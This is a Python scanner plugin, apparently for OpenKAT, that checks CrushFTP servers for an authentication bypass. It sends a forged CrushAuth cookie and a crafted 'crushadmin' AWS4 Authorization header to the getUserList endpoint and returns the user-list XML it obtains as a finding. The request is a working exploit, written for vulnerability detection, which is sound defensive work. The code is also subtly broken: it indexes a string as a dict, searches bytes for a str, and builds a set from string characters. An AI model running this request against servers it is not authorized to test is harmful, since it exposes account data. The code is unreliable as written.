from os import getenv
from urllib.parse import urljoin

import requests

from boefjes.job_models import BoefjeMeta

ENDPOINT_PATH = "/WebInterface/function/?command=getUserList&c2f=1111"
HEADERS = {
    "Cookie": "CrushAuth=1743113839553_vD96EZ70ONL6xAd1DAJhXMZYMn1111",
    "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
}
DEFAULT_TRIES = int(getenv("TRIES", "2"))
DEFAULT_PORTS = [8081]


def run(boefje_meta: BoefjeMeta) -> list[tuple[set, str | bytes]]:
    """Tries to download the XML result from a given ip service. If the service
    is talking http(s), on any of the known CrushFTP ports for a few tries.
    If the XML returned contains user_name we know we received an authenticated
    result and thus are vurlnerable."""

    input_ = boefje_meta.arguments["input"]  # input is IPService
    ip_port = input_["ip_port"]
    ip = ip_port["address"]["address"]
    port = ip_port["port"]
    service = input_["service"]["name"]

    if not service["name"].startswith("http"):
        return [({"info/boefje"}, "Skipping because service is not a http(s) service")]

    ports = getenv("PORTS", "")
    if not ports:
        allow_ports = DEFAULT_PORTS
    else:
        allow_ports = [int(port) for port in ports.split(",")]

    if port not in allow_ports:
        return [({"info/boefje"}, "Skipping because port is not known for CrushFTP usage")]

    host = f"{service}://{ip}:{port}"
    full_url = urljoin(host, ENDPOINT_PATH)
    for _ in range(0, DEFAULT_TRIES):
        response = requests.get(
            full_url,
            headers=HEADERS,
            verify=False,  # noqa: S501
            allow_redirects=False,
            timeout=int(getenv("REQUEST_TIMEOUT", "30")),
        )

        if response.status_code == 200 and "user_name" in response.content:
            return [
                (set(response.headers.get("content-type", "text/xml")), response.content),
                ({"openkat/finding"}, "CVE-2025-2855"),
                ({"openkat/finding"}, "CWE-287"),
            ]
    return [(set(), "Exploit on CrushFTP not possible, or not a CrushFTP service")]
